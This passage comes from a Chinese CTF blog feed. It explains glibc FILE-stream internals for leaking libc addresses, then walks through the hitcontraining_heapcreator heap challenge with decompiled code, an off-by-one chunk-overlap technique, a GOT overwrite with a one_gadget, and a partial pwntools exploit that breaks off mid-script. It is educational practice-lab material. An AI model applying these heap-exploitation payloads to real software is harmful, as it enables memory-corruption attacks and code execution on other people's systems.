我们需要跟进一下该函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> _IO_new_file_xsputn (FILE *, <span class="type">const</span> <span class="type">void</span> *, <span class="type">size_t</span>);</span><br></pre></td></tr></table></figure><p>执行sputn函数的过程中同时执行了_IO_new_file_xsputn继续跟进发现 其调用了_IO_overflow函数 这个函数是否眼熟?</p><p>其存在于我们上面介绍的vtable结构中</p><p>最后我们来看起决定作用的_IO_new_file_overflow函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_doallocbuf (f);</span><br><span class="line">      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">     If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">     logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">     read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">     makes room for subsequent output.</span></span><br><span class="line"><span class="comment">     Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">     alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">      _IO_free_backup_area (f);</span><br><span class="line">      f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">      f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">    f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">              f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们需要绕过第一个if判断 那么就使得f-&gt;_flags &amp; _IO_NO_WRITES为0</p><p>接下要绕过第二个判断 那么使得(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)为1</p><p>最后其调用了_IO_do_write函数 该函数实际上是new_do_write函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">               &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">               ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而else if判断式中的fp-&gt;_IO_write_base - fp-&gt;_IO_read_end我们满足不了</p><p>如果<code>fp-&gt;_IO_read_end</code>的值设置为0  那么<code>_IO_SYSSEEK</code>的第二个参数值就会过大</p><p>如果设置<code>fp-&gt;_IO_write_base = fp-&gt;_IO_read_end</code>的话   那么在其它地方就会有问题</p><p>因为<code>fp-&gt;_IO_write_base 不能大于 fp-&gt;_IO_write_end</code></p><p>所以这里要设置<code>fp-&gt;_flags | _IO_IS_APPENDING</code>，避免进入else if 分支</p><p>综上所述 因此我们要泄露基址的话 需要将flag改为0xfbad1800</p><p>并且随着第四个参数_IO_write_base的不同 可以泄露不同的libc地址(原理不懂 照抄吧)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+b<span class="string">&quot;\x58&quot;</span> <span class="comment">//泄露_IO_file_jumps</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad3887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>)  <span class="comment">//泄露_IO_2_1_stdin_</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hitcontraining_heapcreator</title>
      <link href="/2022/12/19/hitcontraining-heapcreator/"/>
      <url>/2022/12/19/hitcontraining-heapcreator/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>做完这道题又学到一种合并堆的手法 感觉收获颇丰</p><p>checksec 看一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>常规的64位堆菜单题</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(buf) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        edit_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        delete_heap();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;heaparray + i) = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      v0 = *(&amp;heaparray + i);</span><br><span class="line">      *(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !*(*(&amp;heaparray + i) + <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      **(&amp;heaparray + i) = size;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input(*(*(&amp;heaparray + i) + <span class="number">1</span>), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来分析一下create函数 首先创建了一个0x10大小的堆块 并将其地址存储在bss段上的一个全局数组里面 随后让我们输入要创建的堆块大小 这里我们先将这个0x10大小的堆块称为伴随堆块</p><p>接着将创建的这个堆块的地址存储在伴随堆块的第二个字长处 并且将创建的大小存在第一个字长处</p><p>基础的堆还是很常见这种创建两个chunk的 一般利用手法就是覆盖地址 来任意地址写 这里留意一下就可以了</p><p>再来看一下edit函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(*(*(&amp;heaparray + v1) + <span class="number">1</span>), **(&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意一下这个read_input函数就好了 跟进一下看是干什么的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">read_input</span><span class="params">(<span class="type">void</span> *a1, <span class="type">size_t</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = read(<span class="number">0</span>, a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( result &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解起来没什么难度 * (*(&amp;heaparray + v1) + 1)) 是我们创建的堆块的地址  **(&amp;heaparray + v1) + 1LL是伴随堆块的第一个字长处的内容 也就是我们输入的size 二者结合起来 这个函数就是向我们创建的堆块中输入我们之前定义好的size大小 也就是不能进行堆溢出了(不破坏堆结构的情况下)</p><p>接着再看一下show函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size : %ld\nContent : %s\n&quot;</span>, **(&amp;heaparray + v1), *(*(&amp;heaparray + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用的是printf函数 遇到\x00截停 这个就不用说了 留意一下 反正泄露基址肯定是用到show函数的</p><p>最后是比较关键的delete函数 看一下我们有什么漏洞可以利用吗</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(*(&amp;heaparray + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很遗憾的是把指针置零了 不能UAF 或者double free来任意写</p><p>程序遍历到这里 就应该有个差不多的思路了 先泄露基址 然后再通过伴随堆块的地址索引来任意写</p><p>那么具体怎么实现呢？</p><p>我这里选择的是unsortedbin 泄露main_arena地址 没办法 太好用了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x88</span>,<span class="string">b&quot;aaaa&quot;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&quot;bbbb&quot;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&quot;cccc&quot;</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">add(<span class="number">0x88</span>,payload) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = main_arena - (<span class="number">0x7fa0ee626b78</span>-<span class="number">0x7fa0ee262000</span>)</span><br></pre></td></tr></table></figure><p>chunk1和chunk2的作用我们这里可以先不用去纠结 先来解释一下payload为什么这样写 因为我们要通过show函数泄露基址的话</p><p>刚才也说过了 printf函数遇到\x00就会截停 所以fd域那边就会截停 但是我们创建堆块一定要输入数据 所以泄露fd的话最后得到的是不完整的地址 所以干脆覆盖满fd域 这样就会一直输出到fd域的地址 就泄露了基址 libc的计算办法我前面的博客有说到 这里不赘述</p><p>接下来的难点还是在如何利用伴随堆块来任意写 我们没有办法进行堆溢出 不过我们还是有办法溢出一点点字节的</p><p>如果我们申请一个0xn8的堆块 但是实际上系统分配给我们的是0xn0的堆块 但是存储起来的size是多出了16个字节的  因为64位情况下 堆块的最小单位是0x10字节 所以我们可以溢出覆盖到下一个chunk的size域 </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x88</span>)+<span class="string">b&quot;\x71&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里溢出覆盖到的实际上是chunk1的伴随堆块 这也导致其往后0x70的空间都被划为这个堆块的区域 因为glibc识别到了size 被我们所欺骗了 这时候释放chunk1 bin中就会存储一个0x70大小的free chunk</p><p><a href="https://pic.imgdb.cn/item/639f21d6b1fccdcd36004b11.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/639f21d6b1fccdcd36004b11.png"></a></p><p>我们重新申请一个chunk的话 就拥有了0x60大小的空间</p><p><a href="https://pic.imgdb.cn/item/639f41d3b1fccdcd36403a45.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/639f41d3b1fccdcd36403a45.png"></a></p><p>同时 你还要注意 chunk2的指针是仍然存在的 而我们获得的空间是包含chunk2的伴随堆块</p><p>这时候你回忆一下 edit函数是根据伴随堆块的第二个字长处的地址来写入第一个字长处大小的数据 所以我们通过覆盖这两个字长 就可以做到任意地址任意长度写</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x8</span>*<span class="number">10</span>)+p64(<span class="number">0x8</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">0x60</span>,payload) <span class="comment">#1</span></span><br><span class="line"><span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0xf02a4</span></span><br><span class="line">edit(<span class="number">2</span>,p64(onegadget_addr))</span><br></pre></td></tr></table></figure><p>随后还有最后一个你可能会犯错的地方 你之前def的函数 如果有包括delete函数执行完以后 程序给你输出的done 那么是接收不到的 因为如果pwn成功了 直接就进行了系统调用 没有机会输出done的 手动再写一下就可以了</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,29378)</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./buu16_64.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;SuccessFul&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    